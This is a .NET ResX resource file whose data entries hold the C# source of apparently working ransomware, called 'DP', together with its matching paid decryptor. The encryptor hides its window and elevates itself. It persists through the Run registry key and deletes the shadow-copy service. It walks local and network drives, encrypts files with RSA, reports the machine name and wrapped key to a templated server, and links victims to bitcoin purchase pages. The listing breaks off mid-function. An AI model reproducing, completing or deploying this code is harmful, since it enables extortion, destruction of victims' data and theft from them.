<?xml version="1.0" encoding="utf-8"?>
<root>
  <!-- 
    Microsoft ResX Schema 
    
    Version 2.0
    
    The primary goals of this format is to allow a simple XML format 
    that is mostly human readable. The generation and parsing of the 
    various data types are done through the TypeConverter classes 
    associated with the data types.
    
    Example:
    
    ... ado.net/XML headers & schema ...
    <resheader name="resmimetype">text/microsoft-resx</resheader>
    <resheader name="version">2.0</resheader>
    <resheader name="reader">System.Resources.ResXResourceReader, System.Windows.Forms, ...</resheader>
    <resheader name="writer">System.Resources.ResXResourceWriter, System.Windows.Forms, ...</resheader>
    <data name="Name1"><value>this is my long string</value><comment>this is a comment</comment></data>
    <data name="Color1" type="System.Drawing.Color, System.Drawing">Blue</data>
    <data name="Bitmap1" mimetype="application/x-microsoft.net.object.binary.base64">
        <value>[base64 mime encoded serialized .NET Framework object]</value>
    </data>
    <data name="Icon1" type="System.Drawing.Icon, System.Drawing" mimetype="application/x-microsoft.net.object.bytearray.base64">
        <value>[base64 mime encoded string representing a byte array form of the .NET Framework object]</value>
        <comment>This is a comment</comment>
    </data>
                
    There are any number of "resheader" rows that contain simple 
    name/value pairs.
    
    Each data row contains a name, and value. The row also contains a 
    type or mimetype. Type corresponds to a .NET class that support 
    text/value conversion through the TypeConverter architecture. 
    Classes that don't support this are serialized and stored with the 
    mimetype set.
    
    The mimetype is used for serialized objects, and tells the 
    ResXResourceReader how to depersist the object. This is currently not 
    extensible. For a given mimetype the value must be set accordingly:
    
    Note - application/x-microsoft.net.object.binary.base64 is the format 
    that the ResXResourceWriter will generate, however the reader can 
    read any of the formats listed below.
    
    mimetype: application/x-microsoft.net.object.binary.base64
    value   : The object must be serialized with 
            : System.Runtime.Serialization.Formatters.Binary.BinaryFormatter
            : and then encoded with base64 encoding.
    
    mimetype: application/x-microsoft.net.object.soap.base64
    value   : The object must be serialized with 
            : System.Runtime.Serialization.Formatters.Soap.SoapFormatter
            : and then encoded with base64 encoding.

    mimetype: application/x-microsoft.net.object.bytearray.base64
    value   : The object must be serialized into a byte array 
            : using a System.ComponentModel.TypeConverter
            : and then encoded with base64 encoding.
    -->
  <xsd:schema id="root" xmlns="" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:msdata="urn:schemas-microsoft-com:xml-msdata">
    <xsd:import namespace="http://www.w3.org/XML/1998/namespace" />
    <xsd:element name="root" msdata:IsDataSet="true">
      <xsd:complexType>
        <xsd:choice maxOccurs="unbounded">
          <xsd:element name="metadata">
            <xsd:complexType>
              <xsd:sequence>
                <xsd:element name="value" type="xsd:string" minOccurs="0" />
              </xsd:sequence>
              <xsd:attribute name="name" use="required" type="xsd:string" />
              <xsd:attribute name="type" type="xsd:string" />
              <xsd:attribute name="mimetype" type="xsd:string" />
              <xsd:attribute ref="xml:space" />
            </xsd:complexType>
          </xsd:element>
          <xsd:element name="assembly">
            <xsd:complexType>
              <xsd:attribute name="alias" type="xsd:string" />
              <xsd:attribute name="name" type="xsd:string" />
            </xsd:complexType>
          </xsd:element>
          <xsd:element name="data">
            <xsd:complexType>
              <xsd:sequence>
                <xsd:element name="value" type="xsd:string" minOccurs="0" msdata:Ordinal="1" />
                <xsd:element name="comment" type="xsd:string" minOccurs="0" msdata:Ordinal="2" />
              </xsd:sequence>
              <xsd:attribute name="name" type="xsd:string" use="required" msdata:Ordinal="1" />
              <xsd:attribute name="type" type="xsd:string" msdata:Ordinal="3" />
              <xsd:attribute name="mimetype" type="xsd:string" msdata:Ordinal="4" />
              <xsd:attribute ref="xml:space" />
            </xsd:complexType>
          </xsd:element>
          <xsd:element name="resheader">
            <xsd:complexType>
              <xsd:sequence>
                <xsd:element name="value" type="xsd:string" minOccurs="0" msdata:Ordinal="1" />
              </xsd:sequence>
              <xsd:attribute name="name" type="xsd:string" use="required" />
            </xsd:complexType>
          </xsd:element>
        </xsd:choice>
      </xsd:complexType>
    </xsd:element>
  </xsd:schema>
  <resheader name="resmimetype">
    <value>text/microsoft-resx</value>
  </resheader>
  <resheader name="version">
    <value>2.0</value>
  </resheader>
  <resheader name="reader">
    <value>System.Resources.ResXResourceReader, System.Windows.Forms, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089</value>
  </resheader>
  <resheader name="writer">
    <value>System.Resources.ResXResourceWriter, System.Windows.Forms, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089</value>
  </resheader>
  <data name="DP_Decrypter" xml:space="preserve">
    <value>using System;
using System.Collections.Generic;
using System.Drawing;
using System.Text;
using System.Windows.Forms;
using System.IO;
using System.Net;
using System.Security.Cryptography;
using System.Text.RegularExpressions;
using System.Threading;

namespace DP_Decrypter
{
    public partial class MainForm : Form
    {
        private string DecryptionKey = "";
        public MainForm()
        {
            InitializeComponent();

        }

        private void NewFile(string c)
        {
            filenameLbl.Invoke((MethodInvoker)
                delegate
                {
                    filenameLbl.Text = c;
                });
        }

        private Thread[] Threads;
        private object locker = new object();
        private Queue&lt;string&gt; Files = new Queue&lt;string&gt;();
        private List&lt;string&gt; directories = new List&lt;string&gt;();
        private string vector = "%VECTOR%";
        private string CryptedExtension = "%EXTENSION%";
        private bool allFiles = false;

        private void MainForm_Load(object sender, EventArgs e)
        {

        }

        private void oneFileBtn_Click(object sender, EventArgs e)
        {
            try
            {
                OpenFileDialog ofd = new OpenFileDialog();
                ofd.Filter = "Encrypted file|*"+CryptedExtension;
                if (ofd.ShowDialog() == DialogResult.OK)
                {
                    RSACryptoServiceProvider RSA = new RSACryptoServiceProvider();
                    RSA.FromXmlString(DecryptionKey);
                    DecryptFile(ofd.FileName, RSA);
                }
            }
            catch (Exception ex)
            {
                MessageBox.Show(ex.ToString());
            }
        }

        private void allFilesBtn_Click(object sender, EventArgs e)
        {
            if (allFiles)
            {
                filenameLbl.Text = "Scanning...";
                DecryptAllFiles();
            }
            else MessageBox.Show("Access error: The key for decrypting a single file.");
        }

        private void DecryptAllFiles()
        {
            Files = ShareDrives(GetDrives());
            StartThreads();
            SendInfo();
        }


        private List&lt;byte[]&gt; GetCryptedPart(string fileName)
        {
            try
            {
                int size = 130000;
                FileInfo FN = new FileInfo(fileName);
                if (FN.Length &lt; 130000) size = Convert.ToInt32(FN.Length);
                List&lt;byte[]&gt; byteFile = new List&lt;byte[]&gt;();
                byte[] file = new byte[size]; // size = 40950 max
                using (var stream = File.OpenRead(fileName))
                {
                    stream.Seek(-(size), SeekOrigin.End);
                    stream.Read(file, 0, size);
                }
                string s = Encoding.Default.GetString(file);
                string cryptedText = new Regex(@"&lt;CRYPTED&gt;(.*)&lt;/CRYPTED&gt;", RegexOptions.IgnoreCase).Match(s).Groups[1].Value;
                int len = "&lt;CRYPTED&gt;&lt;/CRYPTED&gt;".Length + cryptedText.Length;
                using (var writer = File.OpenWrite(fileName)) writer.SetLength(writer.Length - len);
                file = Convert.FromBase64String(cryptedText);
                int blocks_count = file.Length / 128;
                int k = 0;
                //if(file.Length &lt; 128) byteFile.Add(file);
                for (int i = 0; i &lt; blocks_count; i++)
                {
                    byte[] middle = new byte[128];
                    for (int j = 0; j &lt; 128; j++)
                    {
                        middle[j] = file[k];
                        k = k + 1;
                    }
                    byteFile.Add(middle);
                }
                return byteFile;
            }
            catch (Exception ex)
            {
                //MessageBox.Show(ex.ToString());
                return null;
            }
        }

        private void DecryptFile(string file, RSACryptoServiceProvider rsa)
        {
            try
            {
                List&lt;byte[]&gt; priv = GetCryptedPart(file);
                List&lt;byte&gt; decr = new List&lt;byte&gt;();
                foreach (byte[] bts in priv)
                {
                    byte[] crypto = rsa.Decrypt(bts, false);
                    decr.AddRange(crypto);
                }
                byte[] buff = decr.ToArray();
                using (FileStream fs = new FileStream(file, FileMode.Append, FileAccess.Write))
                {
                    fs.Write(buff, 0, buff.Length);
                    fs.Flush();
                    fs.Close();
                }
                string newname = new Regex(@"(.*)\[id-(.*)\%EXTENSION%").Replace(file, "$1");
                File.Move(file, newname);
                File.Delete(file);
            }
            catch (Exception)
            {

            }

        }

        private Queue&lt;string&gt; ShareDrives(List&lt;string&gt; Drives)
        {
            List&lt;string&gt; temp = new List&lt;string&gt;();
            foreach (string Drive in Drives)
            {
                Console.WriteLine(Drive + " started");
                try
                {
                    temp.AddRange(GetFiles(Drive));
                }
                catch (Exception ex)
                {

                }
                Console.WriteLine("// Done //");
            }
            Queue&lt;string&gt; Files = new Queue&lt;string&gt;(temp);
            return Files;
        }

        private List&lt;string&gt; GetDrives()
        {
            try
            {
                List&lt;string&gt; Drives = new List&lt;string&gt;();
                DriveInfo[] allDrives = DriveInfo.GetDrives();
                foreach (DriveInfo drive in allDrives)
                {
                    Drives.Add(drive.Name);
                }
                if (Drives.Contains("C:\\"))
                {
                    Drives.RemoveAt(Drives.IndexOf("C:\\"));
                    Drives.Add("C:\\");
                }
                return Drives;
            }
            catch (Exception ex)
            {
                return null;
            }
        }

        private List&lt;string&gt; GetFiles(string path)
        {
            List&lt;string&gt; files = new List&lt;string&gt;();
            string desktop = Environment.GetFolderPath(Environment.SpecialFolder.DesktopDirectory);
            try
            {
                files.AddRange(Directory.GetFiles(path, "*"+CryptedExtension, SearchOption.TopDirectoryOnly));
                foreach (var directory in Directory.GetDirectories(path))
                {
                    if (directory == Environment.GetFolderPath(Environment.SpecialFolder.Windows)) continue;
                    if (directory != desktop)
                    {
                        files.AddRange(GetFiles(directory));
                        directories.Add(directory);
                    }
                }
                files.AddRange(Directory.GetFiles(desktop, "*"+CryptedExtension));
            }
            catch (Exception ex) { }

            return files;
        }

        private void StartThreads()
        {
            try
            {
                Threads = new Thread[1];
                for (int i = 0; i &lt; 1; i++)
                {
                    Threads[i] = new Thread(this.Handler);
                    Threads[i].IsBackground = true;
                    Threads[i].Start();
                }
            }
            catch (Exception ex)
            {

            }
        }

        private void Handler()
        {
            try
            {
                RSACryptoServiceProvider ThRSA = new RSACryptoServiceProvider();
                ThRSA.FromXmlString(DecryptionKey);
                while (Files.Count != 0 &amp;&amp; Files != null)
                {
                    string file = "";
                    lock (locker)
                    {
                        file = Files.Dequeue();
                        NewFile(Path.GetFileName(file));
                    }
                    if (!String.IsNullOrEmpty(file))
                    {
                        DecryptFile(file, ThRSA);
                    }
                }
                filenameLbl.Text = "All files are decrypted.";
                filenameLbl.ForeColor = Color.Green;
                if (Files.Count == 0) SendInfo();
            }
            catch (Exception)
            {

            }
        }

        private void SendInfo()
        {
            try
            {
                var request = (HttpWebRequest)WebRequest.Create(("%SERVER%" + "/api/Decrypted.php").Replace("//", "/"));
                var postData = "vector=" + vector;
                postData += "&amp;decryption_info=" + DecryptionKey;
                var data = Encoding.ASCII.GetBytes(postData);
                request.Method = "POST";
                request.ContentType = "application/x-www-form-urlencoded";
                request.ContentLength = data.Length;

                using (var stream = request.GetRequestStream())
                { stream.Write(data, 0, data.Length); }
                var response = (HttpWebResponse)request.GetResponse();
                var responseString = new StreamReader(response.GetResponseStream()).ReadToEnd();
                MessageBox.Show(responseString);
            }
            catch (Exception)
            {

            }
        }

        private void checkBtn_Click(object sender, EventArgs e)
        {
            string dash = keyTB.Text;
            if (dash[4] == 't')
            {
                allFiles = true;
                dash = dash.Substring(0, 4) + dash.Substring(5, dash.Length - 5);
            }
            DecryptionKey = Encoding.Default.GetString(Convert.FromBase64String(dash));
            if (DecryptionKey.Contains("RSAKeyValue"))
            {
                allFilesBtn.Enabled = true;
                oneFileBtn.Enabled = true;
                if (!allFiles) MessageBox.Show("Successful. Key for decrytion 1 file.");
                if (allFiles) MessageBox.Show("Successful.");
            }
        }
    }
}
namespace DP_Decrypter
{
    static class Program
    {
        /// &lt;summary&gt;
        /// Главная точка входа для приложения.
        /// &lt;/summary&gt;
        [STAThread]
        static void Main()
        {
            Application.EnableVisualStyles();
            Application.SetCompatibleTextRenderingDefault(false);
            Application.Run(new MainForm());
        }
    }
}
namespace DP_Decrypter
{
    partial class MainForm
    {
        /// &lt;summary&gt;
        /// Требуется переменная конструктора.
        /// &lt;/summary&gt;
        private System.ComponentModel.IContainer components = null;

        /// &lt;summary&gt;
        /// Освободить все используемые ресурсы.
        /// &lt;/summary&gt;
        /// &lt;param name="disposing"&gt;истинно, если управляемый ресурс должен быть удален; иначе ложно.&lt;/param&gt;
        protected override void Dispose(bool disposing)
        {
            if (disposing &amp;&amp; (components != null))
            {
                components.Dispose();
            }
            base.Dispose(disposing);
        }

        #region Код, автоматически созданный конструктором форм Windows

        /// &lt;summary&gt;
        /// Обязательный метод для поддержки конструктора - не изменяйте
        /// содержимое данного метода при помощи редактора кода.
        /// &lt;/summary&gt;
        private void InitializeComponent()
        {
            this.panel1 = new System.Windows.Forms.Panel();
            this.filenameLbl = new System.Windows.Forms.Label();
            this.nowLbl = new System.Windows.Forms.Label();
            this.orLbl = new System.Windows.Forms.Label();
            this.allFilesBtn = new System.Windows.Forms.Button();
            this.oneFileBtn = new System.Windows.Forms.Button();
            this.keyTB = new System.Windows.Forms.TextBox();
            this.checkBtn = new System.Windows.Forms.Button();
            this.panel1.SuspendLayout();
            this.SuspendLayout();
            // 
            // panel1
            // 
            this.panel1.BorderStyle = System.Windows.Forms.BorderStyle.FixedSingle;
            this.panel1.Controls.Add(this.checkBtn);
            this.panel1.Controls.Add(this.filenameLbl);
            this.panel1.Controls.Add(this.nowLbl);
            this.panel1.Controls.Add(this.orLbl);
            this.panel1.Controls.Add(this.allFilesBtn);
            this.panel1.Controls.Add(this.oneFileBtn);
            this.panel1.Location = new System.Drawing.Point(1, 225);
            this.panel1.Name = "panel1";
            this.panel1.Size = new System.Drawing.Size(459, 47);
            this.panel1.TabIndex = 0;
            // 
            // filenameLbl
            // 
            this.filenameLbl.AutoSize = true;
            this.filenameLbl.ForeColor = System.Drawing.Color.Red;
            this.filenameLbl.Location = new System.Drawing.Point(35, 29);
            this.filenameLbl.Name = "filenameLbl";
            this.filenameLbl.Size = new System.Drawing.Size(27, 13);
            this.filenameLbl.TabIndex = 4;
            this.filenameLbl.Text = "hold";
            // 
            // nowLbl
            // 
            this.nowLbl.AutoSize = true;
            this.nowLbl.Location = new System.Drawing.Point(3, 28);
            this.nowLbl.Name = "nowLbl";
            this.nowLbl.Size = new System.Drawing.Size(32, 13);
            this.nowLbl.TabIndex = 3;
            this.nowLbl.Text = "Now:";
            // 
            // orLbl
            // 
            this.orLbl.AutoSize = true;
            this.orLbl.Location = new System.Drawing.Point(280, 7);
            this.orLbl.Name = "orLbl";
            this.orLbl.Size = new System.Drawing.Size(16, 13);
            this.orLbl.TabIndex = 2;
            this.orLbl.Text = "or";
            // 
            // allFilesBtn
            // 
            this.allFilesBtn.Cursor = System.Windows.Forms.Cursors.Hand;
            this.allFilesBtn.Enabled = false;
            this.allFilesBtn.Location = new System.Drawing.Point(139, 2);
            this.allFilesBtn.Name = "allFilesBtn";
            this.allFilesBtn.Size = new System.Drawing.Size(135, 23);
            this.allFilesBtn.TabIndex = 1;
            this.allFilesBtn.Text = "Decrypt all PC";
            this.allFilesBtn.UseVisualStyleBackColor = true;
            this.allFilesBtn.Click += new System.EventHandler(this.allFilesBtn_Click);
            // 
            // oneFileBtn
            // 
            this.oneFileBtn.Cursor = System.Windows.Forms.Cursors.Hand;
            this.oneFileBtn.Enabled = false;
            this.oneFileBtn.Location = new System.Drawing.Point(300, 2);
            this.oneFileBtn.Name = "oneFileBtn";
            this.oneFileBtn.Size = new System.Drawing.Size(155, 23);
            this.oneFileBtn.TabIndex = 0;
            this.oneFileBtn.Text = "Choose 1 file and decrypt it";
            this.oneFileBtn.UseVisualStyleBackColor = true;
            this.oneFileBtn.Click += new System.EventHandler(this.oneFileBtn_Click);
            // 
            // keyTB
            // 
            this.keyTB.Location = new System.Drawing.Point(1, 3);
            this.keyTB.Multiline = true;
            this.keyTB.Name = "keyTB";
            this.keyTB.Size = new System.Drawing.Size(456, 216);
            this.keyTB.TabIndex = 1;
            // 
            // checkBtn
            // 
            this.checkBtn.Cursor = System.Windows.Forms.Cursors.Hand;
            this.checkBtn.Location = new System.Drawing.Point(3, 2);
            this.checkBtn.Name = "checkBtn";
            this.checkBtn.Size = new System.Drawing.Size(130, 23);
            this.checkBtn.TabIndex = 5;
            this.checkBtn.Text = "Check sytax of key";
            this.checkBtn.UseVisualStyleBackColor = true;
            this.checkBtn.Click += new System.EventHandler(this.checkBtn_Click);
            // 
            // MainForm
            // 
            this.AutoScaleDimensions = new System.Drawing.SizeF(6F, 13F);
            this.AutoScaleMode = System.Windows.Forms.AutoScaleMode.Font;
            this.ClientSize = new System.Drawing.Size(461, 273);
            this.Controls.Add(this.keyTB);
            this.Controls.Add(this.panel1);
            this.Name = "MainForm";
            this.Text = "DP Decrypter";
            this.Load += new System.EventHandler(this.MainForm_Load);
            this.panel1.ResumeLayout(false);
            this.panel1.PerformLayout();
            this.ResumeLayout(false);
            this.PerformLayout();

        }

        #endregion

        private System.Windows.Forms.Panel panel1;
        private System.Windows.Forms.Label orLbl;
        private System.Windows.Forms.Button allFilesBtn;
        private System.Windows.Forms.Button oneFileBtn;
        private System.Windows.Forms.Label filenameLbl;
        private System.Windows.Forms.Label nowLbl;
        private System.Windows.Forms.Button checkBtn;
        private System.Windows.Forms.TextBox keyTB;
    }
}</value>
  </data>
  <data name="res" xml:space="preserve">
    <value>using System;
using System.Collections.Generic;
using System.Collections.Specialized;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Net;
using System.Reflection;
using System.Security.Cryptography;
using System.Text;
using System.Threading;
using System.Runtime.InteropServices;
using System.Security.Principal;
using System.Text.RegularExpressions;
using System.Windows.Forms;
using Microsoft.Win32;
using System.Runtime.InteropServices;

namespace DP_MainForm
{
    public partial class Form1 : Form
    {
        public Form1()
        {
        }

        private void LocalbitcoinsLL_LinkClicked(object sender, LinkLabelLinkClickedEventArgs e)
        {
            Process.Start("https://localbitcoins.com/buy_bitcoins");
        }

        private void howLL_LinkClicked(object sender, LinkLabelLinkClickedEventArgs e)
        {
            Process.Start("http://www.coindesk.com/information/how-can-i-buy-bitcoins/");
        }

        private void Form1_Load(object sender, EventArgs e)
        {
            this.Visible = false;
        }
        private void Form1_MouseDown(object sender, MouseEventArgs e)
        {
            base.Capture = false;
            Message m = Message.Create(base.Handle, 0xa1, new IntPtr(2), IntPtr.Zero);
            this.WndProc(ref m);
        }

        private void pictureBox1_MouseDown(object sender, MouseEventArgs e)
        {
            base.Capture = false;
            Message m = Message.Create(base.Handle, 0xa1, new IntPtr(2), IntPtr.Zero);
            this.WndProc(ref m);
        }
    }
}
namespace DP_MainForm
{
    public sealed  class Program
    {

        const string name = "svch";
        private static Thread[] Threads;
        private object locker = new object();
        private static string server = "%SERVER%";
        private static string mail = "%FIRST_MAIL%";
        private static string vector = "%INC_VECTOR%";
        private static string text = "%TEXT_FOR_UNLOCK%";
        private static string RSA_MasterPublic = "%RSA_PUBLIC%";
        private static string CryptedExtension = "%EXTENSION%";
        private static bool LockerForValidKey = true;
        private static string PCID = "";
        private static string RSA_Public = "";
        private static string RSA_Private = "";
        private static int FilesCount = 0;
        private static bool SaveTextForUnlock = Boolean.Parse("%STFU%");
        //private static bool SaveTextForUnlock = Boolean.Parse("True");
        public static RSACryptoServiceProvider MasterRSA = new RSACryptoServiceProvider();
        public static RSACryptoServiceProvider rsa = new RSACryptoServiceProvider();
        public static List&lt;string&gt; directories = new List&lt;string&gt;();

        private static string CryptedPrivateKey = "";
        /// &lt;summary&gt;
        /// Главная точка входа для приложения.
        /// &lt;/summary&gt;
        [STAThread]
        static void Main(string[] args)
        {
            try
            {
                var handle = NativeMethods.GetConsoleWindow();
                NativeMethods.ShowWindow(handle, NativeMethods.SW_HIDE);

                string appdata = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);

                if (File.Exists(appdata + "\\DP\\welldone.dp"))
                {
                    Process.Start("#DECRYPT MY FILES#.html");
                    Environment.Exit(0);
                }
                else
                {
                    if (args.Length == 0)
                    {
                        bool cycle = CycleDefender();
                        if(cycle == true)
                        {
                            int p1 = ProcessCount();
                            if (!IsAdmin()) RunAsAdmin();
                            int p2 = ProcessCount();
                            if (p2 &gt; p1) Environment.Exit(0);
                        }
                    }
                    if (File.Exists("id.dp")) PCID = File.ReadAllText("id.dp");
                    else { PCID = ID_Generator(); File.WriteAllText("id.dp", PCID); }
                    text = text.Replace("%ID%", PCID);
                    Stopwatch stopWatch = new Stopwatch();
                    stopWatch.Start();
                    if (CheckKeys() == false)
                    {
                        CreateKeys();
                        MasterRSA.FromXmlString(RSA_MasterPublic);
                        rsa.FromXmlString(RSA_Public);
                        SavePrivateKey();
                        while (LockerForValidKey)
                        {
                        }
                        AddToAutorun();
                        DeleteShadowCopies();
                    }
                    text = text.Replace("%KEY%", CryptedPrivateKey);
                    GetDrives();
                    Handler();
                    stopWatch.Stop();
                    int minutes = (stopWatch.Elapsed.Hours * 60) + stopWatch.Elapsed.Minutes;
                    string time = minutes + ":" + stopWatch.Elapsed.Seconds;
                    AddEncryptedPC(time, CryptedPrivateKey);
                    File.WriteAllText(appdata+"\\DP\\welldone.dp", "Done");
                    Process.Start("#DECRYPT MY FILES#.html");
                    Environment.Exit(0);
                }
            }
            catch (Exception)
            {
                
            }
            
            
        }

        private static bool CycleDefender() // Будет возвращать true если запуск разрешен и false - если нет.
        {
            try
            {
                string appdata = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
                string file = appdata + "\\DP\\RunAsAdmin.dp";
                if (!Directory.Exists(appdata + "\\DP"))
                {
                    Directory.CreateDirectory(appdata + "\\DP");
                    File.WriteAllText(file, "0");
                    return true;
                }
                else
                {
                    string RAA = File.ReadAllText(file);
                    if (RAA == "0")
                    {
                        File.WriteAllText(file, "1");
                        return true;
                    }
                    else
                    {
                        return false;
                    }
                }
            }
            catch
            {
                return true;
            }
        }

        private static void AddToAutorun()
        {
            try
            {
                string appdata = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
                if (!Directory.Exists(appdata + "\\DP")) Directory.CreateDirectory(appdata + "\\DP");
                File.Copy(Application.ExecutablePath,appdata+"\\DP\\DP_Main.exe");
                RegistryKey myKey = Registry.LocalMachine.OpenSubKey(@"SOFTWARE\Microsoft\Windows\CurrentVersion\Run", true);
                myKey.SetValue("DP_Main", appdata+"\\DP\\DP_Main.exe");
                myKey.Close();
            }
            catch (Exception)
            {
                
            }
        }


        private static void DeleteShadowCopies()
        {
            try
            {
                ProcessStartInfo psiOpt = new ProcessStartInfo(@"cmd.exe", @"/C sc delete VSS");
                psiOpt.WindowStyle = ProcessWindowStyle.Hidden;
                psiOpt.RedirectStandardOutput = true;
                psiOpt.UseShellExecute = false;
                psiOpt.CreateNoWindow = true;
                Process procCommand = Process.Start(psiOpt);
                StreamReader srIncoming = procCommand.StandardOutput;
                string resp = srIncoming.ReadToEnd();
                procCommand.WaitForExit();
            }
            catch(Exception)
            {

            }
        }


        private static bool CheckKeys()
        {
            string documents = "";
            string progfiles = "";
            try
            {
                documents = Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments);
                progfiles = Environment.GetFolderPath(Environment.SpecialFolder.ProgramFiles) + "\\DP";
            }
            catch (Exception)
            {}
            
            string FileName = "\\DecryptionInfo.auth";
            string Public = "";
            string Private = "";
            if (File.Exists(documents + FileName))
            {
                string text = File.ReadAllText(documents + FileName);
                Public = text.Split('\n')[1]; Private = text.Split('\n')[0];
            }
            if (File.Exists(progfiles + FileName))
            {
                string text = File.ReadAllText(progfiles + FileName);
                Public = text.Split('\n')[1]; Private = text.Split('\n')[0];
            }
            if (Public != "")
            {
                RSA_Public = Public;
                CryptedPrivateKey = Private;
                return true;
            }
            else return false;
        }

        private static void CreateKeys()
        {
            RSA_Public = rsa.ToXmlString(false);
            RSA_Private = rsa.ToXmlString(true);
        }

        [DllImport("USER32.DLL", CharSet = CharSet.Unicode)]
        public static extern IntPtr FindWindow(string lpClassName,
            string lpWindowName);
        [DllImport("USER32.DLL")]
        public static extern bool SetForegroundWindow(IntPtr hWnd);

        static class NativeMethods
        {
            [DllImport("kernel32.dll")]
            static public extern IntPtr GetConsoleWindow();

            [DllImport("user32.dll")]
            static public extern bool ShowWindow(IntPtr hWnd, int nCmdShow);

            public const int SW_HIDE = 0;
            public const int SW_SHOW = 5;
        }

        public static string ID_Generator()
        {
            string pass = "";
            var r = new Random();
            while (pass.Length &lt; 8)
            {
                Char c = (char)r.Next(33, 125);
                if (Char.IsLetterOrDigit(c))
                    pass += c;
            }
            return pass;
        }


        private static void AddEncryptedPC(string elapsed_time, string DecryptionInfo)
        {
            try
            {
                string url = server + "/api" + "/Encrypted.php";
                using (var webClient = new WebClient())
                {
                    var pars = new NameValueCollection();
                    pars.Add("v", vector);
                    pars.Add("fc", FilesCount.ToString());
                    pars.Add("computer_name", Environment.MachineName);
                    pars.Add("et", elapsed_time);
                    pars.Add("decryption_info", DecryptionInfo);
                    pars.Add("id", PCID);
                    var response = webClient.UploadValues(url, pars);
                }
            }
            catch (Exception)
            {
                
            }
        }

        public static bool IsAdmin()
        {
            WindowsIdentity id = WindowsIdentity.GetCurrent();
            WindowsPrincipal p = new WindowsPrincipal(id);
            return p.IsInRole(WindowsBuiltInRole.Administrator);
        }
        public static int ProcessCount()
        {
            int p = 0;
            Process[] etc = Process.GetProcesses();
            foreach (Process anti in etc)
            {
                if (anti.ProcessName.ToLower().Contains("dp_main")) p++;
            }
            return p;
        }
        public static void RunAsAdmin()
        {
            ProcessStartInfo processInfo = new ProcessStartInfo();
            processInfo.Verb = "runas";
            processInfo.FileName = Directory.GetCurrentDirectory() + "\\DP_Main.exe";
            try
            {
                Process.Start(processInfo);
            }
            catch (Exception)
            {

            }
        }
        private static void Handler()
        {
            try
            {
                PriorityEncryption();
                while (Drives.Count != 0 &amp;&amp; Drives != null)
                {
                    string drive = "";
                    drive = Drives.Dequeue();
                    if (!String.IsNullOrEmpty(drive))
                    {
                        EncryptFolder(drive);
                    }
                }
                GetDesktopFiles(Environment.GetFolderPath(Environment.SpecialFolder.Desktop));
            }
            catch (Exception ex)
            {

            }
        }
        private static void SavePrivateKey()
        {
            List&lt;byte[]&gt; master = new List&lt;byte[]&gt;();
            byte[] masterbytes = Encoding.Default.GetBytes(RSA_Private);
            int iterations = Convert.ToInt32(Math.Ceiling((double)masterbytes.Length / 117));
            int k = 0;
            for (int i = 0; i &lt; iterations; i++)
            {
                byte[] b = new byte[117];
                for (int j = 0; j &lt; 117; j++)
                {
                    if (masterbytes.Length &gt; k)
                    {
                        b[j] = masterbytes[k];
                        k++;
                    }
                }
                master.Add(b);
            }
            string strBytes = "";
            foreach (byte[] bts in master)
            {
                byte[] encrypted = MasterRSA.Encrypt(bts, false);
                strBytes += Encoding.Default.GetString(encrypted);
            }
            strBytes = Convert.ToBase64String(Encoding.Default.GetBytes(strBytes));
            CryptedPrivateKey = strBytes;
            strBytes += "\n" + RSA_Public;
            if(KeyValidity())
            {
                SaveKeysToFiles(strBytes);
                LockerForValidKey = false;
            }
        }

        private static bool KeyValidity()
        {
            byte[] KeyBytes = Convert.FromBase64String(CryptedPrivateKey);
            if(KeyBytes.Length != 1024)
            {
                Console.WriteLine("BAD LENGTH: "+KeyBytes.Length);
                CreateKeys();
                return false;
            }
            else
            {
                Console.WriteLine("SUCCESS: 1024");
                LockerForValidKey = false;
                return true;
            }
        }

        private static void SaveKeysToFiles(string text)
        {
            try
            {
                string documents = Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments);
                string progfiles = Environment.GetFolderPath(Environment.SpecialFolder.ProgramFiles) + "\\DP";
                string DPName = "\\DecryptionInfo.auth";
                File.WriteAllText(documents + DPName, text);
                Directory.CreateDirectory(progfiles);
                File.WriteAllText(progfiles + DPName, text);
            }
            catch (Exception)
            {
                
            }
           
        }

        private static Queue&lt;string&gt; Drives = new Queue&lt;string&gt;();

        private static void GetDrives()
        {
            try
            {
                DriveInfo[] allDrives = DriveInfo.GetDrives();
                bool c_contain = false;
                foreach (DriveInfo drive in allDrives)
                {
                    if (drive.Name.Contains("C:\\")) c_contain = true;
                    else
                    {
                        if(!Drives.Contains(drive.Name))
                        {
                            Drives.Enqueue(drive.Name);
                        }
                    }
                }
                if (c_contain) Drives.Enqueue("C:\\");
                return;
            }
            catch (Exception ex)
            {
                return;
            }
        }

        private static void GetNetwork()
        {
            List&lt;string&gt; Network = new List&lt;string&gt;();
            try
            {
                string result = DoCMD("NET VIEW");
                string[] resultList = result.Replace("\r\n", "\n").Split('\n');
                foreach (string line in resultList)
                {
                    if (line.Contains(@"\\"))
                    {
                        Network.Add(line.Split(' ')[0]);
                    }
                }
            }
            catch (Exception) {}
            try
            {
                string result = DoCMD("NET USE").Replace("\r\n", "\n");
                string[] resultList = result.Split('\n');
                foreach (string line in resultList)
                {
                    string drive = new Regex(@"\s(\S{2})\s").Match(line).Groups[1].Value;
                    if(!Drives.Contains(drive+"\\") &amp;&amp; drive.Contains(":")) Drives.Enqueue(drive + "\\");
                    string NetResource = new Regex(@"(\\\\[^\\\s]*)", RegexOptions.IgnoreCase).Match(line).Groups[1].Value;
                    if (NetResource != "")
                    {
                        if(!Network.Contains(NetResource)) Network.Add(NetResource);
                    }
                }
            }
            catch(Exception) {}
            foreach (string device in Network)
            {
                try
                {
                    string result = DoCMD("NET VIEW " + device);
                    string[] resultList = result.Replace("\r\n", "\n").Split('\n');
                    foreach (string line in resultList)
                    {
                        if (line.Contains("Disk"))
                        {
                            string folder = BackspacesCleaner(line);
                            Drives.Enqueue(device + "\\" + folder);
                        }
                    }
                }
                catch(Exception) {} 
            }

        }

        private static string DoCMD(string command)
        {
            try
            {
                ProcessStartInfo startInfo = new ProcessStartInfo(@"cmd.exe", @"/C " + command);
                startInfo.WindowStyle = ProcessWindowStyle.Hidden;
                startInfo.RedirectStandardOutput = true;
